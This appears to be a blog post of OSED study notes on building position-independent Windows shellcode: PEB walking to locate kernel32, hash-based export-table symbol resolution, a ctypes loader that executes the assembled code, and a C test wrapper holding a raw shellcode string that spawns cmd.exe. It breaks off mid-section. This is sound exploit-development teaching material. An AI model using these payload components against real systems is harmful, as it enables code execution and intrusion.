---
title: "Shellcode Methodology"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - Reverse engineering
  - Exploit development
  - Penetration testing
  - Shellcode 
---

The below is a general outline on how I've approached building custom shellcode. 

# Introduction

When working with custom shellcode we have a couple of problems to solve. We won’t dive into them in too much detail for the report however provide a good overview.

1. System calls - We need to implement a reliable way to utilise the Windows API. We can invoke them if loaded or load them from a DLL file. 
2. Kernel32 - Kernel32’s base address needs to be found. We’ll utlise the reliable PEB method which involves parsing the *Process Environmental Block.*
3. Symbol (function name) resolution - We need to resolve the functions within our `kernel32.dll` and other library files. I will be using the *******Export Directory Table (EDT)******* method. Effectively extracting the base of any library, using the EDT, and extracts the relative virtual address (RVA). We then utilise hash comparisons to get a function we want to resolve and store the address.
4. Position independent shellcode is required and therefore we need the absolute address of the functions we want to call, and store them in registers before execution.

## Null Bytes

Our shellcode cannot contain null bytes, and we need to ensure before we call new APIs within our shellcode we eliminate null-bytes within our current functions.

## Position Independent Shellcode

We need to move away from calling our shellcode directly, as this will generate null bytes. We have two techniques to deal with this.

1. Dynamically gather the absolute address and store it in a register.
2. Move all the instructions being called above the `CALL` instruction.

Our shellcode is better off having dynamically generated addresses as we can inject it anywhere in memory, and do not have to worry about null bytes. Here is some articles around various techniques used.

[https://en.wikipedia.org/wiki/Position-independent_code](https://en.wikipedia.org/wiki/Position-independent_code)

[https://ir0nstone.gitbook.io/notes/types/stack/pie](https://ir0nstone.gitbook.io/notes/types/stack/pie)

[https://infosecwriteups.com/shellcode-analysis-313bf4ca4dec](https://infosecwriteups.com/shellcode-analysis-313bf4ca4dec)

The technique learned in the course material of OSED leverages the fact that functions within a lower address will use negative address. The `CALL` instruction will push the return address onto the stack and we can then pop it into a register and dynamically calculate the absolute address of the function. Effectively, need to dynamically generate the absolute address of the functions we want to call, and store them in registers before execution. We can also utilise indirect calls to generate negative offsets. We will utilise the techniques learned during the course.

Now that we have an understanding of the challenges, we focus on how we are going to focus on our general approach to building the shellcode. Due to system calls having different call numbers between OS, we should utilise the Windows API, which is exported through the DLL files. We can invoke them, or load the DLL. Windows expose the `kernel32.dll` which expose several of the functions required as summarised below.

- `LoadLibraryA` function implements the mechanism to load DLLs.
- `GetModuleHandleA` can be used to get the base address of already loaded DLLs.
- `GetProcAddress` can be used to resolve symbols.

We dont’ know the base address of `kernel32.dll` and therefore our shellcode will first resolve it using the PEB method. Once we have `kernel32.dll` loaded we can call several of the above functions. The Export Directory Table (EDT) is a data structure within the Portable Executable (PE) file format of Windows executables. It contains information about functions (APIs) that are exported by a dynamic-link library (DLL) or executable, making those functions available for other programs to use. When resolving APIs in shellcode, the Export Directory Table can be used to find the addresses of the required functions. We’ll be diving into this technique later in our shellcode process.

We proceed with building our shellcode and starting with resolving `kernel32.dll`. We first recap how we will be building our shellcode using the required keystone-engine and python ctypes.

## 0. Shellcode Assembly

We utilise *Keystone* and python *CTypes* libraries. 

Our script should do the following:

- Transform ASM code into opcodes
- Allocate a chunk of memory for our shellcode
- Copy our shellcode to the allocated memory
- Execute the shellcode from the allocated memory

We use the following boilerplate as taught within the OSED coursework. 

```python
import ctypes, struct
from keystone import *

CODE = (
""
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
```

## 1. Resolving Kernel32.dll

By obtaining the base address of *`kernel32.dll`* and resolving its exported functions, we’ll be able to load additional DLLs using *`LoadLibraryA`* and leverage *`GetProcAddress`* to resolve functions within them. We need to find the base address of the imported `kernel32.dll` dynamically to ensure our shellcode works across various versions of Windows. We utilise what is referred to as the PEB method. The operating system allocates the Process Environment Block (PEB) structure for each active process. Locating it involves inspecting the process memory, commencing from the address stored in the FS register. In 32-bit iterations of the Windows operating system, the FS register invariably holds a reference to the present Thread Environment Block (TEB), which, in turn, is a data structure housing details about the currently-running thread.

A brief summary of the technique provided below:

- The `FS` register which on 32bit systems always point to the TEB’s base address.
- Traverse the `TEB` to find our address, which stores information about our current running thread.
- The `TEB` structure, holds a pointer at offset `0x30` to our `PEB`. We care about the `_PEB_LDR_DATA` structure within `PEB` located at offset `0x0C` inside the PEB.
- The specific pointer references three linked lists revealing the loaded modules that is mapped into the process space. Effectively we parse the `InInitializationOrderModuleList` doubly-linked list and use the `BaseDllName` field to find our desired module until we have a match. When dumping the structure we subtract the value `0x10` from the address of the `_LIST_ENTRY` structure in order to reach the beginning of the *`LDR_DATA_TABLE_ENTRY`* structure.
    - *InLoadOrderModuleList* shows the previous and next module in load order.
    - *InMemoryOrderModuleList* shows the previous and next module in memory placement order.
    - *InInitializationOrderModuleList* shows the previous and next module in initialization order.
- Once we have our matching name, we gather the base address from the `DllBase` field.

The above process can be recreated using the below assembly instructions to retrieve the `kernel32.dll` base address.

```python
" start:                             "  #
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff9f0           ;"  #   allocate space for our exploit avoiding NULL bytes

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module
```

An explanation of the above instructions are detailed below. The `find_kernel32` function is responsible for locating the *kernel32* module in memory. Here is a breakdown of its steps:

1. `xor ecx, ecx`: This instruction sets the value of the `ecx` register to zero.
2. `mov esi, fs:[ecx+0x30]`: This instruction retrieves the value of the `PEB` (Process Environment Block) from the `fs` segment register. The `PEB` is a data structure that contains information about the current process. In this case, it retrieves the address of the `PEB` structure by accessing the `fs` segment at an offset of 0x30.
3. `mov esi, [esi+0x0C]`: This instruction accesses the `PEB` structure and retrieves the address of the `Ldr` (Loader) field. The `Ldr` field points to the loader data structure that maintains information about loaded modules.
4. `mov esi, [esi+0x1C]`: This instruction accesses the `Ldr` structure and retrieves the address of the `InInitOrder` field. The `InInitOrder` field points to the first entry in the list of loaded modules.

Next we have the `next_module` function.

1. `mov ebx, [esi+0x08]`: This instruction retrieves the base address of the kernel32 module. It accesses the base address by reading the value at the offset of 0x08 from the current module entry in the `InInitOrder` list.
2. `mov edi, [esi+0x20]`: This instruction retrieves the module name of the current module entry. It accesses the module name by reading the value at the offset of 0x20 from the current module entry in the `InInitOrder` list.
3. `mov esi, [esi]`: This instruction sets `esi` to the address of the next module entry in the `InInitOrder` list, preparing for the next iteration of the loop.
4. `cmp [edi+12*2], cx`: This instruction compares the 12th character of the module name with the value in the `cx` register, which is zero. It checks if the 12th character is a null byte, indicating the end of the string.
5. `jne next_module`: This instruction jumps to the `next_module` label if the previous comparison does not result in equality. In other words, if the 12th character of the module name is not a null byte, the loop continues to the next module. 

The overall loop continues until the kernel32 module is found, which is determined by encountering a module with a null byte as the 12th character in its name. At that point, the base address of the kernel32 module is stored in the `ebx` register, and the execution continues with the next instruction after the `find_kernel32` function.

We step through the instruction until *`kernel32.dll`* is found as shown below.

```python

```

In summary, to find the address of the *kernel32.dll* we traverse several in-memory structures as summarised below:

1. Get address of *PEB* with *fs:0x30*
2. Get address of *PEB_LDR_DATA* (offset *0x0C*)
3. Get address of the first list entry in the *InMemoryOrderModuleList* (offset *0x14*)
4. Get address of the second (*ntdll.dll*) list entry in the *InMemoryOrderModuleList* (offset *0x00*)
5. Get address of the third (*kernel32.dll*) list entry in the *InMemoryOrderModuleList* (offset *0x00*)
6. Get the base address of *kernel32.dll* (offset *0x10*)

Now that we’ve got the base address of kernel32 sorted we need to resolve symbols within kernel32. 

## 2. Symbol Resolution

[https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html)

We utilise the EDT (*******Export Address Table)******* to identify our addresses. Therefore to resolve the symbols (function names) of our **************`kernel32.dll`* and other libraries we will utilise the EDT method. Note that Relative Virtual Address (RVA) is an address relative to the base address of the PE executable, when its loaded in memory (RVAs are not equal to the file offsets when the executable is on disk!).

The EDT has the following important information that we need to read:

- Number of exported symbols
- Relative Virtual Address (RVA) of the export-functions array
- RVA of the export-names array
- RVA of the export-ordinals array

The table structure definition is as follows.

```c
typedef struct _IMAGE_EXPORT_DIRECTORY 
{ 
	DWORD Characteristics;
	DWORD TimeDateStamp; 
	WORD MajorVersion; 
	WORD MinorVersion; 
	DWORD Name;
	DWORD Base;
	DWORD NumberOfFunctions; 
	DWORD NumberOfNames; 
	DWORD AddressOfFunctions; 
	DWORD AddressOfNames;
	DWORD AddressOfNameOrdinals;
}
```

There exists a direct correspondence (*one to one relationship*) between the *AddressOfFunctions*, *AddressOfNames*, and *AddressOfNamesOrdinals* arrays. To obtain a symbol’s name, we initiate the process with the *AddressOfNames* array. Each name holds a distinct entry and corresponding index within the array. Once the target symbol's name is located at index *i* in the *AddressOfNames* array, we can utilize the identical index *i* in the *AddressOfNamesOrdinals* array for further operations. The below diagram (*EAT function VMA)* outlines the process and are obtained from the official OSED coursework.

![Untitled](7%201%20Shellcode%20Guide%20880426d1648743bd8d8498304a125ea4/Untitled.png)

The value retrieved from the *AddressOfNamesOrdinals a*rray at position *i* serves as an index within the *AddressOfFunctions* array. At this index, we locate the relative virtual memory address of the function. By adding the DLL's base address to this address, we obtain a fully functional *Virtual Memory Address* (VMA). In order to prioritize both the size and portability of our shellcode, we aim to enhance the efficiency of our symbol name search algorithm. To achieve this goal, we will employ a specific hashing function that converts a string into a four-byte hash value. This approach enables the reutilization of assembly instructions for any specified symbol name. The algorithm yields identical outcomes as *GetProcAddress* function and can be applied to any DLL. Once the *LoadLibraryA* symbol is resolved, it becomes possible to load various modules and locate the necessary functions for constructing custom shellcode, all without relying on *GetProcAddress*. 

We effectively do the following:

- Extracts the base of the module, uses the export directory table
- Extracts the relative virtual address (RVA).
- Utilise a hash comparison to get a function we specifically want to call.

We can hash function names using the following script as taught in the OSED coursework. The hashing function specifically converts a string into a four byte hash.

```python
#!/usr/bin/python
import numpy, sys
def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return (int(binb, 2))
if __name__ == '__main__':
    try:
        esi = sys.argv[1]
    except IndexError:
        print("Usage: %s INPUTSTRING" % sys.argv[0])
        sys.exit()
    # Initialize variables
    edx = 0x00
    ror_count = 0
    for eax in esi:
        edx = edx + ord(eax)
        if ror_count < len(esi)-1:
            edx = ror_str(edx, 0xd)
        ror_count += 1
    print(hex(edx))
```

Following that, we introduce several new functions with the below assembly shellcode which will be discussed below.

```python
  	" find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of library to search is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
```

Let’s dive into each of the above functions in a bit more detail. 

The `find_function_shorten` jumps to `find_function_shorten_bnc` using a short jump instruction. The `find_function_ret` is called after a relative jump. It pops the return address from the stack, saves it in memory for later usage, and jumps to `resolve_symbols_kernel32`. We discuss this function later, however, it’s responsible to resolving the address of our functions within kernel32.

We now move into one of the most important functions `find_function`. The function is responsible for resolving function addresses within the loaded modules. It retrieves the *Export Table Directory* (EDT) RVA (Relative Virtual Address), the number of exported names, and the RVA of the symbol names. It then iterates over the symbol names, computes a hash for each name, and compares it to the requested hash. If a match is found, it extracts the function's ordinal and retrieves the function's RVA. The `find_function_loop` iterates through the exported function names in the *Export Table Directory* (EDT). It retrieves the RVA (*Relative Virtual Address*) of each symbol name, computes a hash for the name, and compares it with the requested hash.

The imperative `compute_hash` function computes a hash for a given symbol name. It iterates over each byte of the name, rotates the accumulator (`edx`) 13 bits to the right, and adds the current byte to the accumulator. The function starts with an *XOR* operation, which sets the EAX register to NULL. This instruction is followed by the *CDQ* instruction, which uses the NULL value in EAX to set EDX to NULL as well. The last instruction of this function is *CLD*  which clears the direction flag (*DF*) in the *EFLAGS* register. Executing this instruction will cause all string operations to increment the index registers, which are ESI (where our symbol name is stored) and/or EDI. This replicates our python script we’ve introduced.

We then reach the *`compute_hash_again`* that iterates over each byte of a symbol name and continues computing the hash value. The loop continues until a null terminator is encountered in the symbol name, at which point the control flow jumps to `compute_hash_finished`.  The function starts with a *LODSB* instruction. This instruction will load a byte from the memory pointed to by ESI into the AL register and then automatically increment or decrement the register according to the DF flag. This is followed by a *TEST* instruction using the AL register as both operands. If AL is NULL, we will take the *JZ* conditional jump to the *`compute_hash_finished`*. This function doesn’t contain any instructions and is used as an indicator that we have reached the end of our symbol name. If AL is not NULL, we’ll arrive at a *ROR*231 bit-wise operation. This assembly instruction rotates the bits of the first operand to the right by the number of bit positions specified in the second operand. In our case, EDX is rotated right by 0x0D bits.

The `find_function_compare` compares the computed hash with the requested hash. If they match, it retrieves the function's ordinal, gets the function's RVA from the *AddressOfFunctions* table, and adds the base address of the module to get the function's virtual memory address. We start with the `cmp edx, [esp+0x24**]**`: This instruction compares the value in the EDX register with the value stored at the memory location `[ESP + 0x24]`. Effectively comparing the the computed hash with the requested hash. The `jnz find_function_loop` is a conditional jump instruction. If the previous comparison (cmp) did not result in "zero" (the values are not equal), the program will jump to the label `find_function_loop`. If our hashes doesn’t match, we jump back to the loop.

If the functions do match, `mov edx, [edi+0x24]` executes. Moving the *AddressOfNameOrdinals* RVA stored at `[EDI + 0x24]` into the EDX register. We then execute `add edx, ebx` which adds the AddressOfNameOrdinals RVA and base address stored into EBX together. The `mov cx, [edx+2*ecx]`moves the value stored at the memory location `[EDX + 2*ECX]` into the CX register to extrapolate the function's ordinal. The AddressOfFunctions RVA is then moved into EDX using the `mov edx, [edi+0x1c]`. We then repeat the process of adding the the AddressOfNameOrdinals RVA and base address stored into EBX together. We now retrieve the function RVA using `mov eax, [edx+4*ecx]` . The ECX register contains the function's ordinal. We calculate the function's virtual memory address (VMA) by adding the two together. Finally the `mov [esp+0x1c], eax`moves the value in the EAX register (function's VMA) to the memory location `[ESP + 0x1c]`, effectively overwriting the stack version of EAX that was pushed onto stack earlier using "pushad”  within `find_function`.

Now that we have all the code that will resolve our functions by using the hash comparison we can proceed. We will need to start with `kernel32.dll` as we will be using several of its functions to load other libraries, execute our shellcode etc. 

Taking stock of the functions we will need, we will need to resolve the following based on the requirements. We’ve included some standard functions that is commonly used within building shellcode such as `lstrcatA` and `GetLastError`.

- TerminateProcess
- LoadLibraryA
- CreateProcessA
- GetLastError
- lstrcatA
- GetProcAddress

We also utilise some of the MSDN documentation to understand if these API functions are within `Kernel32`. We then complete the table with all the functions we might require, their hashes, and the library file they will be loaded from.

[https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea)

[https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-copyfileexa](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-copyfileexa)

[https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

[https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess)

[https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lstrcata](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lstrcata)

We will be utilising these functions to build the remainder of our shellcode. We start with generating the hash for each using the python script as outlined below. We will be updating the table as we build our shellcode.

| Function | Hash | Library |
| --- | --- | --- |
| TerminateProcess | 0x78b5b983 | Kernel32 |
| LoadLibraryA | 0xec0e4e8e | Kernel32 |
| CreateProcessA | 0x16b3fe72 | Kernel32 |
| lstrcatA | 0xcb73463b | Kernel32 |
| GetLastError | 0x75da1966 | Kernel32 |
| GetProcAddress | 0x7c0dfcaa | Kernel32 |
| CopyFileExA | 0x7ee258e7 | Kernel32 |
| GetModuleHandleA | 0xd3324904 | Kernel32 |
| WinExec |  |  |
|  |  |  |
|  |  |  |
|  |  |  |

The `resolve_symbols_kernel32` function is created next. We push the above hashes onto the stack, then call our `find_function`. We then save the address at offsets from EBP in order to ensure our shellcode is position independent. 

```python
" resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage

    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage

    "   push  0x16b3fe72                 ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage

    "   push  0xcb73463b                ;"  #   lstrcatA hash
	"   call dword ptr [ebp+0x04]       ;"  #   Call find_function
	"   mov  [ebp+0x1c], eax           ;"  #   Save lstrcatA address for later usage

    "   push  0x75da1966                ;"  #   GetLastError hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x20], eax           ;"  #   Save GetLastError address for later usage

    "   push  0x7c0dfcaa                ;"  #   GetProcAddress hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x24], eax           ;"  #   Save GetProcAddress address for later usage

    "   push  0x7ee258e7                ;"  #   CopyFileExA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x28], eax           ;"  #   Save CopyFileExA address for later usage
```

The **`resolve_symbols_kernel32`** function is responsible for resolving the addresses of specific functions in the kernel32 module. It uses the previously found base address of the kernel32 module and the **`find_function`** function to obtain the addresses of the desired functions. Here is a breakdown of its steps:

1. **`push 0x78b5b983`**: This instruction pushes the hash value of the function name "TerminateProcess" onto the stack.
2. **`call dword ptr [ebp+0x04]`**: This instruction calls the **`find_function`** function, passing the hash value as an argument. It expects the address of the "TerminateProcess" function to be returned.
3. **`mov [ebp+0x10], eax`**: This instruction moves the returned address of the "TerminateProcess" function into the memory location **`[ebp+0x10]`** for later usage.
4. **`push 0xec0e4e8e`**: This instruction pushes the hash value of the function name "LoadLibraryA" onto the stack.
5. **`call dword ptr [ebp+0x04]`**: This instruction calls the **`find_function`** function again, passing the hash value as an argument. It expects the address of the "LoadLibraryA" function to be returned.
6. **`mov [ebp+0x14], eax`**: This instruction moves the returned address of the "LoadLibraryA" function into the memory location **`[ebp+0x14]`** for later usage.
7. **`push 0x16b3fe72`**: This instruction pushes the hash value of the function name "CreateProcessA" onto the stack.
8. **`call dword ptr [ebp+0x04]`**: This instruction calls the **`find_function`** function once more, passing the hash value as an argument. It expects the address of the "CreateProcessA" function to be returned.
9. **`mov [ebp+0x18], eax`**: This instruction moves the returned address of the "CreateProcessA" function into the memory location **`[ebp+0x18]`** for later usage.

After executing these steps, the addresses of the desired functions ("TerminateProcess", "LoadLibraryA", and "CreateProcessA") in the kernel32 module are stored in memory locations **`[ebp+0x10]`**, **`[ebp+0x14]`**, and **`[ebp+0x18]`**, respectively. These addresses can be retrieved later for invoking the corresponding functions.

We do a quick check for any null-bytes by using the memory dumper of WinDBG at our shellcode location.


Let’s step through the instructions one by one for the `TerminateProcess`.  We slowly check each function using the `u @eip La` command until we confirm our hashes match successfully.

```python
0:003> u @eax
KERNEL32!TerminateProcessStub:
763c9070 8bff            mov     edi,edi
763c9072 55              push    ebp
763c9073 8bec            mov     ebp,esp
763c9075 5d              pop     ebp
763c9076 ff2534494276    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76424934)]
763c907c cc              int     3
763c907d cc              int     3
763c907e cc              int     3
```

Now that we confirm our function works, we will be using the following shellcode boilerplate to resolve any functions within libraries we’ve loaded. Note that we resolve our symbols directly after importing the library so we can still move the base address into the `EBX` register as required by our `find_function`.

```python
	  " load_xxxx:                         "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   push dword 0xxxxx               ;"  #   Push "xxxx"    
    "   push dword 0xxxxx               ;"  #   Push "xxxx"
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA

	  " resolve_symbols_xxxx:          "
    "   mov   ebx, eax                  ;"  #   Move the base address of xxxx from LoadLibraryA return to EBX for find_function
    "   push  0xxxxx                    ;"  #   xxxx hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x30], eax           ;"  #   Save xxxx address for later usage
```

## 3. Shellcode Building

Here we start going over the winAPIs we will be using to build our shellcode and do a short walkthrough over each of them. For the example we’ll be covering executing for example WinExec.
    
- Additional API details
    
    We can use the source code from REACTOS e.g. [https://doxygen.reactos.org/index.html](https://doxygen.reactos.org/index.html)
    
     Also reference [https://www.pinvoke.net/](https://www.pinvoke.net/) for more details.


- C to Assembly
    
    We can look for C or C++ code examples of specific WinAPI usage from [https://cpp.hotexamples.com/](https://cpp.hotexamples.com/). We can then compile the applications and investigate how the functions are to be used. Compile can be done using the following:
    
    ```python
    cl desktop.c /link "C:\Program Files\Microsoft SDKs\Windows\v7.1A\Lib\XXX.Lib" "C:\Program Files\Microsoft SDKs\Windows\v7.1A\Lib\XXXX.lib"
    ```
    
    Example boilerplate code:
    
    ```python
    #include <windows.h>
    #include <userenv.h>
    #include <stdio.h>
    
    int main() {
    
     printf("\n Hello OSED.. \n");
    
    }
    ```
    
- Debugging Errors
    
    To debug errors while building shellcode the WinAPI `GetLastError` is very useful. Import and use as follow: [https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror)
    
    ```python
    " resolve_symbols_kernel32:          "
      "   push  0x75da1966                ;"  #   GetLastError hash
      "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
      "   mov  [ebp+0x38], eax           ;"  #   Save GetLastError address for later usage
      "   call dword ptr [ebp+0x38]  ;"  #   Call GetLastError
    ```
    
    [https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-)

    
- Testing C++ Shellcode Wrapper
    
    ```python
    #include<stdio.h>
    #include<string.h>
    char shellcode[]=\
    
    "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x68\x79\x41\x41\x41\x66\x89\x5c\x24\x01\x68\x65\x6d\x6f\x72\x68\x65\x72\x6f\x4d\x68\x52\x74\x6c\x5a\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x89\xca\xb2\x54\x51\x83\xec\x54\x8d\x0c\x24\x51\x52\x51\xff\xd0\x59\x31\xd2\x68\x73\x41\x42\x42\x66\x89\x54\x24\x02\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x8d\x14\x24\x51\x52\x57\xff\xd6\x59\x83\xc4\x10\x31\xdb\x68\x65\x78\x65\x41\x88\x5c\x24\x03\x68\x63\x6d\x64\x2e\x8d\x1c\x24\x31\xd2\xb2\x44\x89\x11\x8d\x51\x44\x56\x31\xf6\x52\x51\x56\x56\x56\x56\x56\x56\x53\x56\xff\xd0\x5e\x83\xc4\x08\x31\xdb\x68\x65\x73\x73\x41\x88\x5c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x1c\x24\x53\x57\xff\xd6\x31\xc9\x51\xff\xd0";
    
    main()
    {
    printf("shellcode lenght %ld\n",(long)strlen(shellcode));
    (* (int(*)()) shellcode) ();
    }
    ```
    
    ```python
    from keystone import *
    CODE = (
    
    )
    # Initialize engine in 32bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(CODE)
    shellcode = ""
    for dec in encoding:
      egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    print("shellcode = (\"" + shellcode + "\")")
    ```
    

### WinExec

To execute our payload using the Win32 API WinExec. [https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec). Let’s look at the API documentation and inspect the function prototype. This seems to be part of the `Kernel32.dll`.

```python
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);

# Parameters
[in] lpCmdLine

The command line (file name plus optional parameters) for the application to be executed. If the name of the executable file in the lpCmdLine parameter does not contain a directory path, the system searches for the executable file in this sequence:

The directory from which the application loaded.
The current directory.
The Windows system directory. The GetSystemDirectory function retrieves the path of this directory.
The Windows directory. The GetWindowsDirectory function retrieves the path of this directory.
The directories listed in the PATH environment variable.
[in] uCmdShow

The display options. For a list of the acceptable values, see the description of the nCmdShow parameter of the ShowWindow function.
```

We need to ensure that we resolve `WinExec` in `Kernel32.dll`. We add the following code to the function and stores the address into `[ebp+0x28]`.

```python
" resolve_symbols_kernel32:          "
    **"   push  0xe8afe98                ;"  #   WinExec hash
